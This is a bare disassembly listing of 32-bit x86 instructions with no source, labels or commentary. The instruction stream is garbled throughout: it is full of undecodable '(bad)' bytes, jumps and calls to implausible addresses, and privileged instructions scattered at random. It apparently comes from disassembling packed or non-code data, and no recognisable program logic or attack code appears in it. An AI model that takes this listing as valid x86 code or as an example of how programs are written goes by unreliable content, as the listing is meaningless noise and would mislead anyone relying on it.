  431be3:	cmp    DWORD PTR [ebx],esp
  431be5:	or     al,BYTE PTR [ebp+0xf]
  431be8:	mov    eax,DWORD PTR [edx]
  431bea:	loopne 0x431bec
  431bec:	(bad)  
  431bed:	mov    ecx,esi
  431bef:	cld    
  431bf0:	pushf  
  431bf1:	pop    ebp
  431bf2:	fwait
  431bf3:	mov    esi,DWORD PTR [edx]
  431bf5:	lock mov eax,eax
  431bf8:	adc    BYTE PTR [ebx],al
  431bfa:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c01:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c07:	dec    ebp
  431c08:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431c0e:	(bad)  
  431c0f:	iret   
  431c10:	inc    ebp
  431c11:	(bad)  
  431c12:	jne    0x431c61
  431c14:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431c1a:	(bad)  
  431c1b:	cmp    ebx,eax
  431c1d:	je     0x431ba5
  431c1f:	add    edi,edi
  431c21:	or     bh,bh
  431c23:	dec    ebp
  431c24:	inc    ebp
  431c25:	mov    esi,DWORD PTR [ebx]
  431c27:	cld    
  431c28:	add    ecx,esi
  431c2a:	cmp    ecx,DWORD PTR [eax-0xc]
  431c2d:	mov    edx,DWORD PTR [edi]
  431c2f:	or     BYTE PTR [ebp-0x7c],al
  431c32:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431c38:	test   BYTE PTR [ebx+ebx*4],cl
  431c3b:	inc    ebp
  431c3c:	xor    bh,BYTE PTR [esi]
  431c3e:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431c45:	jne    0x431c0e
  431c47:	mov    ebp,esp
  431c49:	fcomp  DWORD PTR [ebx]
  431c4b:	add    BYTE PTR [ecx],al
  431c4d:	inc    DWORD PTR [ebp-0x75]
  431c50:	(bad)  
  431c51:	cld    
  431c52:	add    al,0xce
  431c54:	mov    ecx,edi
  431c56:	cld    
  431c57:	inc    ebp
  431c58:	fidivr WORD PTR [ebx]
  431c5a:	fbstp  TBYTE PTR [ebp-0x3e]
  431c5d:	mov    eax,DWORD PTR [eax]
  431c5f:	adc    BYTE PTR [ebx-0x3974038b],cl
  431c65:	fadd   st,st(7)
  431c67:	add    BYTE PTR [ebp-0x1],al
  431c6a:	mov    ecx,DWORD PTR [esp+edi*8]
  431c6d:	inc    ebp
  431c6e:	mov    bh,0xc7
  431c71:	loopne 0x431cb8
  431c73:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431c79:	sbb    dh,BYTE PTR [ebx]
  431c7b:	pushf  
  431c7c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c82:	mov    eax,edi
  431c84:	cwde   
  431c85:	inc    ebp
  431c86:	inc    ebp
  431c87:	jne    0x431c14
  431c89:	mov    esp,esp
  431c8b:	clc    
  431c8c:	add    al,0x4d
  431c8e:	mov    DWORD PTR [ebx],esi
  431c90:	or     al,0x33
  431c92:	inc    ebp
  431c93:	lea    ecx,[ebx-0x398d13fd]
  431c99:	add    bh,al
  431c9b:	inc    ebp
  431c9c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431ca3:	add    ebp,esp
  431ca5:	shufps xmm1,xmm3,0xc7
  431ca9:	(bad)  
  431caa:	jmp    0x748857d3
  431caf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431cb5:	hlt    
  431cb6:	mov    ecx,DWORD PTR [edi]
  431cb8:	fadd   DWORD PTR [ebp+0x0]
  431cbb:	xor    ecx,DWORD PTR [edi]
  431cbd:	add    ecx,ecx
  431cbf:	cmp    edi,edi
  431cc1:	pmuludq mm7,QWORD PTR [edx+0x50]
  431cc5:	(bad)  
  431cc6:	jmp    0x431c53
  431cc8:	mov    edi,esp
  431cca:	or     al,0xc6
  431ccc:	inc    ebp
  431ccd:	(bad)  
  431cce:	mov    eax,DWORD PTR [ebp+0x10]
  431cd1:	jne    0x431c5c
  431cd3:	mov    eax,DWORD PTR [ecx]
  431cd5:	clc    
  431cd6:	add    BYTE PTR [ebp-0x40],cl
  431cd9:	xor    edx,DWORD PTR [eax-0x73]
  431cdc:	jne    0x431cdf
  431cde:	push   DWORD PTR [edx+0x8]
  431ce1:	add    BYTE PTR [ebp+0x45],al
  431ce4:	mov    ebp,ecx
  431ce6:	cld    
  431ce7:	add    BYTE PTR [ebp+0x0],cl
  431cea:	xor    eax,DWORD PTR [ebp+0x3]
  431ced:	mov    DWORD PTR [ebx],edi
  431cef:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431cf5:	sub    eax,0x5d330e4d
  431cfa:	lea    esi,[ebx]
  431cfc:	add    DWORD PTR [ebx],eax
  431cfe:	jb     0x431ce9
  431d00:	add    BYTE PTR [eax],al
  431d02:	inc    ebp
  431d03:	add    bl,ch
  431d05:	inc    ebp
  431d06:	mov    esi,DWORD PTR [ebx]
  431d08:	or     al,0x3
  431d0a:	(bad)  
  431d0b:	mov    edi,eax
  431d0d:	in     al,dx
  431d0e:	scas   eax,DWORD PTR es:[edi]
  431d0f:	inc    ebp
  431d10:	mov    esi,DWORD PTR [ebx]
  431d12:	in     al,0x3
  431d14:	add    al,0x89
  431d16:	mov    ecx,DWORD PTR [eax+edi*8]
  431d19:	dec    ebp
  431d1a:	(bad)  
  431d1b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431d22:	mov    ecx,eax
  431d24:	cld    
  431d25:	push   es
  431d26:	dec    ebp
  431d27:	add    al,0x33
  431d29:	mov    DWORD PTR [ebx],eax
  431d2b:	in     al,dx
  431d2c:	cmp    DWORD PTR [ebp-0x67],eax
  431d2f:	mov    eax,DWORD PTR [ebp-0xba0068]
  431d35:	mov    edx,DWORD PTR [ebp-0x4]
  431d38:	mov    ecx,DWORD PTR [ebp-0x2c]
  431d3b:	xor    eax,DWORD PTR [ebp+0x3]
  431d3e:	cmp    DWORD PTR [ebx],0x8b32749a
  431d44:	xor    edi,esp
  431d46:	jmp    0xff771a98
  431d4b:	add    ecx,DWORD PTR [ebp-0x3f]
  431d4e:	xor    ebx,DWORD PTR [edi]
  431d50:	add    eax,ecx
  431d52:	cmp    ebx,DWORD PTR [eax]
  431d54:	mov    ecx,DWORD PTR [ebp-0x4]
  431d57:	mov    ecx,DWORD PTR [eax]
  431d59:	adc    BYTE PTR [ebp-0x80],al
  431d5c:	jmp    0x431d5f
  431d5e:	mov    eax,DWORD PTR [eax]
  431d60:	cld    
  431d61:	mov    bh,0xc6
  431d63:	push   ecx
  431d64:	(bad)  
  431d65:	jne    0x431dc5
  431d67:	dec    ecx
  431d69:	or     BYTE PTR [ecx+ebx*1],cl
  431d6c:	push   ebp
  431d6d:	inc    ebp
  431d6e:	in     al,dx
  431d6f:	add    ebp,esp
  431d71:	or     bh,al
  431d73:	dec    ebp
  431d74:	cld    
  431d75:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431d7b:	xor    DWORD PTR [edx],0x2
  431d7e:	pushf  
  431d7f:	dec    DWORD PTR [ebx+0x45510cf4]
  431d85:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d8b:	mov    edx,DWORD PTR [ecx+0xc]
  431d8e:	xor    eax,esi
  431d90:	mov    edx,0xc172c7
  431d95:	inc    ebp
  431d96:	mov    esi,DWORD PTR [ebp+0x8]
  431d99:	mov    eax,edx
  431d9b:	call   0x84c7e490
  431da0:	add    DWORD PTR [ebx-0x76bace00],ebx
  431da6:	mov    ebp,eax
  431da8:	or     BYTE PTR [eax],dl
  431daa:	jo     0x431df9
  431dac:	push   edi
  431dad:	xor    esi,DWORD PTR [ebp+0x3]
  431db0:	(bad)  
  431db1:	pmulhuw mm0,mm1
  431db4:	test   DWORD PTR [ebp-0x8],ecx
  431db7:	mov    DWORD PTR [ebp-0x67],eax
  431dba:	mov    eax,DWORD PTR [ebp-0x4]
  431dbd:	xor    edi,DWORD PTR [ebp-0x73]
  431dc0:	xor    eax,DWORD PTR [ebx]
  431dc2:	xor    esi,DWORD PTR [edx+0x3]
  431dc5:	add    BYTE PTR [ecx],bh
  431dc7:	inc    ebp
  431dc8:	(bad)  
  431dc9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431dcf:	mov    DWORD PTR [eax],0x750f0004
  431dd5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431ddb:	lock add BYTE PTR [ebp+0x0],cl
  431ddf:	mov    esi,DWORD PTR [ebp-0x18]
  431de2:	mov    ebp,edx
  431de4:	or     al,0x72
  431de6:	ja     0x431de8
  431de8:	mov    edx,esi
  431dea:	cld    
  431deb:	(bad)  
  431dee:	cli    
  431def:	mov    esi,DWORD PTR [ebp-0x4]
  431df2:	cmp    ecx,esi
  431df4:	bswap  edi
  431df6:	(bad)
  431dfa:	mov    esi,DWORD PTR [ebp-0x4]
  431dfd:	mov    esi,ecx
  431dff:	clc    
  431e00:	repnz add esi,DWORD PTR [ebp+0x45]
  431e04:	push   ebx
  431e05:	xor    eax,DWORD PTR [ebp+0x3]
  431e08:	cmp    al,0x5f
  431e0a:	pushf  
  431e0b:	pop    ebx
  431e0c:	jmp    0x431ed3
  431e11:	mov    esi,DWORD PTR [ebp-0x7d]
  431e14:	xor    ebp,DWORD PTR [eax]
  431e16:	lea    eax,[ebp-0x8]
  431e19:	xor    edx,esi
  431e1b:	pushf  
  431e1c:	out    dx,eax
  431e1d:	(bad)  
  431e1e:	neg    eax
  431e20:	ins    DWORD PTR es:[edi],dx
  431e21:	test   esi,edi
  431e23:	clc    
  431e24:	pop    esp
  431e25:	inc    ebp
  431e26:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431e2c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431e32:	add    cl,al
  431e34:	jne    0x431dd1
  431e36:	mov    esi,DWORD PTR [edx]
  431e38:	in     al,dx
  431e39:	push   esi
  431e3a:	xor    BYTE PTR [ebp-0xe],dh
  431e3d:	add    edi,esi
  431e3f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431e45:	add    cl,bh
  431e47:	mov    edi,DWORD PTR [ebp+0x8]
  431e4a:	mov    DWORD PTR [ebp-0x14],esi
  431e4d:	add    esi,DWORD PTR [ebp+0x3c]
  431e50:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431e56:	mov    ah,0x3e
  431e58:	fwait
  431e59:	pushf  
  431e5a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431e60:	jne    0x431ded
  431e62:	mov    ecx,DWORD PTR [esp+ebp*8]
  431e65:	icebp  
  431e66:	icebp  
  431e67:	shl    edx,0xf2
  431e6a:	(bad)  
  431e6b:	mov    ah,0x16
  431e6d:	push   eax
  431e6e:	jne    0x431e03
  431e70:	mov    ecx,DWORD PTR [edi]
  431e72:	in     al,dx
  431e73:	jmp    0x431e66
  431e75:	add    dl,dh
  431e77:	mov    edi,esi
  431e79:	or     al,0x8
  431e7b:	inc    ebp
  431e7c:	jne    0x431e81
  431e7e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e84:	ret    
  431e85:	or     bh,bh
  431e87:	jge    0x431e71
  431e89:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e8f:	xor    edi,eax
  431e91:	add    esi,DWORD PTR [ebp-0x77]
  431e94:	mov    ebx,esp
  431e96:	clc    
  431e97:	neg    DWORD PTR [ebp-0x7c]
  431e9a:	xor    eax,DWORD PTR [eax]
  431e9c:	cmp    eax,DWORD PTR [eax]
  431e9e:	repz jne 0x431e36
  431ea1:	xor    eax,DWORD PTR [ecx]
  431ea3:	add    ebx,DWORD PTR [eax]
  431ea5:	mov    DWORD PTR [ebp-0x8],eax
  431ea8:	mov    eax,edi
  431eaa:	cld    
  431eab:	lock pop eax
  431ead:	test   DWORD PTR [ebx],esi
  431eaf:	clc    
  431eb0:	add    edx,DWORD PTR [edi-0x740bff77]
  431eb6:	fdivp  st(4),st
  431eb8:	test   ecx,esi
  431eba:	(bad)  
  431ebb:	jnp    0x431ebc
  431ebd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431ec3:	jae    0x431e50
  431ec5:	sub    edi,esp
  431ec7:	(bad)  
  431ec8:	shl    DWORD PTR [eax-0x3e],0x89
  431ecc:	leave  
  431ecd:	call   0x8198d5da
  431ed2:	in     al,dx
  431ed3:	(bad)  
  431ed4:	in     al,dx
  431ed5:	add    bh,al
  431ed7:	mov    esp,edi
  431ed9:	in     al,dx
  431eda:	test   DWORD PTR [ebp-0x8],edi
  431edd:	mov    eax,DWORD PTR [ebp+0x2b]
  431ee0:	xor    al,BYTE PTR [ebx]
  431ee2:	pushf  
  431ee3:	jnp    0x57321b1c
  431ee9:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431eed:	loopne 0x431f22
  431eef:	jne    0x431eac
  431ef1:	mov    esi,DWORD PTR [edx-0x20]
  431ef4:	add    BYTE PTR [ebp-0x3d],bh
  431ef7:	xor    eax,DWORD PTR [ebp-0x73]
  431efa:	mov    edi,DWORD PTR [esi]
  431efc:	cld    
  431efd:	jb     0x431ec5
  431eff:	add    bl,al
  431f01:	jne    0x431f48
  431f03:	mov    edx,DWORD PTR [edi-0x10]
  431f06:	jge    0x431f85
  431f08:	mov    esi,DWORD PTR [ebx]
  431f0a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431f0e:	xor    esi,DWORD PTR [ebp-0x77]
  431f11:	mov    esi,eax
  431f13:	lock inc ebp
  431f15:	jge    0x431f48
  431f17:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431f1e:	dec    ebp
  431f1f:	mov    esi,DWORD PTR [ebx]
  431f21:	loopne 0x431eac
  431f23:	jge    0x431f1d
  431f25:	add    DWORD PTR [ebp-0x7d],eax
  431f28:	icebp  
  431f29:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431f30:	dec    ebp
  431f31:	hlt    
  431f32:	xor    ebx,DWORD PTR [ebp-0x77]
  431f35:	mov    esi,esp
  431f37:	in     al,0x45
  431f39:	jge    0x431f78
  431f3b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431f42:	dec    ebp
  431f43:	push   esp
  431f44:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431f4a:	inc    ebp
  431f4b:	hlt    
  431f4c:	xor    DWORD PTR [ebp-0x61],esi
  431f4f:	mov    edi,DWORD PTR [eax+0xf19504]
  431f55:	repnz mov DWORD PTR [ebp+0x20],ebx
  431f59:	cmp    eax,DWORD PTR [ebp+0xf]
  431f5c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431f60:	fistp  WORD PTR [ebx+0x0]
  431f63:	inc    ebp
  431f64:	mov    ebx,DWORD PTR [edi+0xc]
  431f67:	add    eax,eax
  431f69:	inc    ebp
  431f6a:	test   BYTE PTR [ebx],dh
  431f6c:	add    eax,DWORD PTR [ebx]
  431f6e:	add    BYTE PTR [esi+0x45],bl
  431f71:	ret    0x85
  431f74:	jnp    0x5443a343
  431f7a:	inc    bp
  431f7c:	inc    ebp
  431f7d:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f83:	fdiv   QWORD PTR [ebx]
  431f85:	test   DWORD PTR [ecx+0x453bf8],edi
  431f8b:	push   ebx
  431f8c:	add    edi,DWORD PTR [esi+0x708088b]
  431f92:	cmp    esi,eax
  431f94:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f9b:	mov    esp,edi
  431f9d:	call   0x33ce64ef
  431fa2:	or     BYTE PTR [ebx],al
  431fa4:	inc    ecx
  431fa5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431fab:	and    BYTE PTR [ebp-0x7074f0bb],al
  431fb1:	lock add cl,al
  431fb4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431fbb:	mov    ch,0x45
  431fbd:	clc    
  431fbe:	xor    eax,DWORD PTR [ebp+0x3]
  431fc1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431fc7:	inc    ebp
  431fc8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431fce:	mov    edi,eax
  431fd0:	mov    eax,DWORD PTR [ebp+0x3c]
  431fd3:	mov    ecx,DWORD PTR [eax]
  431fd5:	hlt    
  431fd6:	inc    ebp
  431fd7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431fde:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431fe4:	push   ebp
  431fe5:	mov    edi,DWORD PTR [ebx]
  431fe7:	in     al,dx
  431fe8:	jne    0x431fab
  431fea:	mov    eax,DWORD PTR [ebp-0x28]
  431fed:	add    DWORD PTR [eax],0xe8058dec
  431ff3:	clc    
  431ff4:	mov    esi,DWORD PTR [edi-0x8]
  431ff7:	add    dh,dl
  431ff9:	rol    WORD PTR [ebp-0x1],cl
  431ffd:	mov    edx,DWORD PTR [eax+0x8]
  432000:	jne    0x431fc2
  432002:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432009:	inc    ebp
  43200a:	push   esp
  43200b:	test   DWORD PTR [ecx+0xf],ecx
  43200e:	sub    edx,esp
  432010:	add    eax,DWORD PTR [eax]
  432012:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432018:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43201f:	mov    eax,DWORD PTR [ecx]
  432021:	and    BYTE PTR [eax],al
  432023:	cmp    al,0x10
  432025:	add    BYTE PTR [ebp+0x66],al
  432028:	inc    ecx
  43202a:	push   esp
  43202b:	add    dh,BYTE PTR [ebp+0x0]
  43202e:	push   edx
  43202f:	enterw 0xc1,0x4d
  432034:	mov    esp,DWORD PTR [esi+0x20]
  432037:	add    DWORD PTR [ecx-0x7b],eax
  43203a:	add    eax,DWORD PTR [ebx]
  43203c:	str    WORD PTR [eax+0x45]
  432040:	lea    ecx,[ebx+0x45890801]
  432046:	sbb    BYTE PTR [ebx],al
  432048:	dec    ebp
  432049:	cmp    al,0xf
  43204b:	inc    ebp
  43204c:	push   eax
  43204d:	mov    esi,DWORD PTR [ebx]
  43204f:	push   eax
  432050:	add    eax,eax
  432052:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432059:	inc    ebp
  43205a:	add    BYTE PTR [ecx],dh
  43205c:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432063:	(bad)  
  432064:	mov    ebx,eax
  432066:	loopne 0x4320ad
  432068:	dec    ebp
  432069:	mov    ecx,DWORD PTR [edi]
  43206b:	cld    
  43206c:	push   eax
  43206d:	xchg   DWORD PTR [ebx],esi
  43206f:	add    DWORD PTR [ebx],ebp
  432071:	add    BYTE PTR [ebx],ch
  432073:	or     BYTE PTR [ecx],bh
  432075:	dec    ecx
  432076:	loopne 0x43207b
  432078:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  43207e:	push   ebp
  43207f:	add    DWORD PTR [ebx+0x55100800],eax
  432085:	dec    ebp
  432086:	jmp    0x432011
  432088:	mov    esp,DWORD PTR [eax]
  43208a:	sbb    dl,dl
  43208c:	inc    eax
  43208d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432093:	add    BYTE PTR [ebx+0x74528555],cl
  432099:	push   ebp
  43209a:	div    DWORD PTR [ebx]
  43209c:	and    eax,DWORD PTR [ebx]
  43209e:	add    edx,DWORD PTR [edx-0x30]
  4320a1:	jno    0x43202e
  4320a3:	inc    DWORD PTR [eax+eiz*1]
  4320a6:	inc    ebp
  4320a7:	push   eax
  4320a8:	push   eax
  4320a9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4320af:	mov    edi,esp
  4320b1:	push   eax
  4320b2:	inc    ebp
  4320b3:	enter  0x458b,0x8
  4320b7:	push   ecx
  4320b8:	(bad)  
  4320b9:	call   0x10d2a91
  4320be:	pop    ss
  4320bf:	push   ebp
  4320c0:	mov    ecx,DWORD PTR [ebx+0x489408]
  4320c6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4320cc:	push   ecx
  4320cd:	jo     0x4320b7
  4320cf:	inc    DWORD PTR [edi]
  4320d1:	or     BYTE PTR [eax],al
  4320d3:	call   0xce281d
  4320d8:	fmul   QWORD PTR [ebp+0x55]
  4320db:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4320e1:	mov    bh,0x8c
  4320e3:	adc    al,0x9b
  4320e5:	dec    esp
  4320e6:	xor    bl,BYTE PTR [eax]
  4320e8:	mov    ecx,DWORD PTR [ebp+0xc]
  4320eb:	mov    eax,DWORD PTR [ebp-0x4]
  4320ee:	mov    esi,DWORD PTR [edi-0x3148f924]
  4320f4:	push   es
  4320f5:	retf   
  4320f6:	mov    BYTE PTR [ebp-0x30],0x3b
  4320fa:	inc    ebp
  4320fb:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432102:	retf   0x83fc
  432105:	into   
  432106:	dec    ebp
  432107:	retf   
  432108:	mov    ecx,DWORD PTR [ebp-0x74]
  43210b:	mov    eax,DWORD PTR [eax]
  43210d:	fdiv   QWORD PTR [ebx]
  43210f:	mov    bh,0x3
  432111:	push   es
  432112:	mov    esi,ecx
  432114:	sbb    cl,dl
  432116:	dec    ebp
  432117:	sar    DWORD PTR [ebx],cl
  432119:	push   ebp
  43211a:	jne    0x43212b
  43211c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432122:	lea    ebx,[eax]
  432124:	call   0xf4ccaceb
  432129:	sbb    dh,dl
  43212b:	add    edx,ebx
  43212d:	push   ebp
  43212e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432134:	push   ecx
  432135:	mov    DWORD PTR [eax-0x30],edx
  432138:	test   DWORD PTR [edx],eax
  43213a:	xadd   esp,esi
  43213d:	pop    es
  43213e:	add    cl,dl
  432140:	mov    eax,ecx
  432142:	or     al,0x45
  432144:	(bad)  
  432145:	push   eax
  432146:	add    DWORD PTR [edx+0x0],eax
  432149:	add    ecx,DWORD PTR [ecx]
  43214b:	and    dh,cl
  43214d:	call   0xc72a1d
  432152:	add    DWORD PTR [ebp+0x0],edx
  432155:	mov    esp,DWORD PTR [ebp+0x18]
  432158:	add    BYTE PTR [eax+0x50],cl
  43215b:	xor    eax,DWORD PTR [eax]
  43215d:	add    esp,DWORD PTR [esi+0x3b]
  432160:	inc    ebp
  432161:	je     0x4320e6
  432163:	push   ecx
  432164:	dec    BYTE PTR [ebp-0x77]
  432167:	add    eax,esi
  432169:	or     al,0x5e
  43216b:	inc    eax
  43216c:	add    BYTE PTR [ebx],al
  43216e:	data16 and BYTE PTR [ebp+0x50],al
  432172:	sub    DWORD PTR [ecx],0xfffffff8
  432175:	add    BYTE PTR [ebp-0x75],ah
  432178:	add    BYTE PTR [eax],bl
  43217a:	enter  0x894d,0x8b
  43217e:	int3   
  43217f:	loopne 0x432143
  432181:	rol    BYTE PTR [eax],0x33
  432184:	lea    cx,[ebp+0xa]
  432188:	data16 jb 0x4321d0
  43218b:	add    BYTE PTR [ebx+0x44890855],cl
  432191:	sbb    ah,al
  432193:	inc    ebp
  432194:	cmp    al,0xf
  432196:	add    BYTE PTR [edx+0x66],dl
  432199:	xor    ecx,DWORD PTR [eax]
  43219b:	sub    eax,DWORD PTR [edx]
  43219d:	mov    eax,DWORD PTR [eax]
  43219f:	or     al,0x66
  4321a1:	ror    edx,cl
  4321a3:	dec    ebp
  4321a4:	inc    ebp
  4321a5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4321ab:	cld    
  4321ac:	or     BYTE PTR [edi+0x4501dd],dl
  4321b2:	ret    0xecce
  4321b5:	retf   
  4321b6:	(bad)  
  4321b7:	dec    ebp
  4321b8:	mov    al,0x8b
  4321ba:	loopne 0x4321dc
  4321bc:	cmp    ecx,DWORD PTR [edx]
  4321be:	inc    ebp
  4321bf:	daa    
  4321c0:	loopne 0x432149
  4321c2:	in     al,dx
  4321c3:	add    edi,eax
  4321c5:	add    BYTE PTR [eax+0x3f52e155],bh
  4321cb:	push   ebp
  4321cc:	inc    ebp
  4321cd:	xor    ebx,edx
  4321cf:	add    ebp,esp
  4321d1:	push   edx
  4321d2:	push   bp
  4321d4:	inc    ebp
  4321d5:	(bad)  
  4321d6:	in     eax,dx
  4321d7:	push   esp
  4321d8:	(bad)  
  4321d9:	inc    edx
  4321db:	sbb    al,0x33
  4321dd:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4321e4:	add    BYTE PTR [ebp+0x46],0x8b
  4321e8:	jmp    0xf98b:0x100041c8
  4321ef:	xor    esi,DWORD PTR [edx+0x3]
  4321f2:	mov    ecx,DWORD PTR [edi]
  4321f4:	fmul   DWORD PTR [edx]
  4321f6:	add    BYTE PTR [eax],al
  4321f8:	lea    eax,[ebx-0x4700273c]
  4321fe:	add    al,0x4f
  432200:	pop    DWORD PTR [eax]
  432202:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432208:	push   edx
  432209:	inc    WORD PTR [ebp+0x8]
  43220d:	mov    eax,0x514f4d
  432212:	(bad)
  432216:	add    al,al
  432218:	xor    DWORD PTR [ebx-0x74baf730],eax
  43221e:	test   DWORD PTR [esi+0x74],esp
  432221:	inc    ebp
  432222:	mov    DWORD PTR [eax+0xa4e08],edi
  432228:	add    BYTE PTR [ecx-0x76c435bb],cl
  43222e:	or     dh,cl
  432230:	or     eax,0x8b8d5045
  432235:	inc    ebp
  432236:	mov    WORD PTR [ecx+0x3b8a00],?
  43223c:	jne    0x432271
  43223e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432244:	add    DWORD PTR [ebx],eax
  432246:	add    bh,bh
  432248:	adc    DWORD PTR [eax],ecx
  43224a:	adc    DWORD PTR [ebp+0x55],edi
  43224d:	push   es
  43224e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432254:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  43225b:	inc    ebp
  43225c:	mov    esp,edi
  43225e:	or     al,0xda
  432260:	push   eax
  432261:	(bad)  
  432262:	jne    0x432218
  432264:	call   0x3b1b53
  432269:	inc    ebp
  43226a:	sar    BYTE PTR [eax],0x84
  43226d:	in     al,dx
  43226e:	add    bh,al
  432270:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  432277:	(bad)  
  432278:	and    al,al
  43227a:	fs in  eax,dx
  43227c:	inc    DWORD PTR [ebp-0x7b]
  43227f:	jle    0x432290
  432281:	leave  
  432282:	scas   al,BYTE PTR es:[edi]
  432283:	inc    esp
  432284:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43228b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432292:	call   DWORD PTR [edi]
  432294:	shr    ah,0x84
  432297:	xchg   DWORD PTR [eax],eax
  432299:	add    DWORD PTR [eax],eax
  43229b:	add    bh,bh
  43229d:	dec    ebp
  43229e:	and    BYTE PTR [ecx-0x38],dl
  4322a1:	push   eax
  4322a2:	dec    DWORD PTR [ebx+0xfd885]
  4322a8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4322ae:	mov    WORD PTR [ecx+0x0],ss
  4322b1:	lea    ecx,[ebx+0x108b20d8]
  4322b7:	mov    WORD PTR [edx],ds
  4322b9:	add    BYTE PTR [edi+0xff01ff],al
  4322bf:	mov    ecx,DWORD PTR [ebp-0x28]
  4322c2:	push   ecx
  4322c3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4322c7:	inc    ebp
  4322c8:	in     al,0xeb
  4322ca:	jno    0x432257
  4322cc:	push   edx
  4322cd:	mov    DWORD PTR [eax-0x28],edx
  4322d0:	mov    eax,DWORD PTR [ebp+0x20]
  4322d3:	je     0x43225c
  4322d5:	mov    eax,DWORD PTR [ecx]
  4322d7:	sbb    BYTE PTR [eax],al
  4322d9:	pop    DWORD PTR [eax]
  4322db:	add    esi,eax
  4322dd:	add    bl,al
  4322df:	adc    DWORD PTR [edi],esi
  4322e1:	jmp    0x8bce7333
  4322e6:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4322ed:	jne    0x43227a
  4322ef:	mov    ecx,DWORD PTR [eax]
  4322f1:	in     al,0x75
  4322f3:	pop    DWORD PTR [ecx+0x5401]
  4322f9:	push   edx
  4322fa:	inc    DWORD PTR [ebx]
  4322fc:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432302:	add    BYTE PTR [edi+0x9],dl
  432305:	call   DWORD PTR [esi]
  432307:	and    dl,al
  432309:	and    bh,bh
  43230b:	inc    edi
  43230d:	test   eax,edx
  43230f:	sldt   ebx
  432312:	xor    al,BYTE PTR [eax]
  432314:	pushf  
  432315:	(bad)  
  432316:	jmp    0x432324
  432318:	mov    eax,edi
  43231a:	or     al,0x75
  43231c:	inc    eax
  43231d:	call   0x431a25
  432322:	mov    eax,eax
  432324:	loopne 0x4322aa
  432326:	inc    ebp
  432327:	add    BYTE PTR [ebx+0x1451c00],cl
  43232d:	mov    eax,DWORD PTR [ebp+0x20]
  432330:	add    edi,ecx
  432332:	add    BYTE PTR [eax],ch
  432334:	cmp    edi,0x18
  432337:	test   DWORD PTR [ebp+0xf],esi
  43233a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432341:	jne    0x432345
  432343:	call   0xffa21e08
  432348:	leave  
  432349:	rcr    BYTE PTR [esp+eax*4],0x55
  43234d:	add    ah,ch
  43234f:	add    BYTE PTR [edi-0x48fef979],dh
  432355:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  43235c:	inc    esp
  43235d:	mov    ebx,DWORD PTR [eax]
  43235f:	fcom   st(2)
  432361:	add    BYTE PTR [edi],bl
  432363:	lea    ecx,[eax-0x18]
  432366:	(bad)  
  432367:	push   DWORD PTR [ecx]
  432369:	call   0xffb570cb
  43236e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432372:	fstp   DWORD PTR [esi+ebx*8]
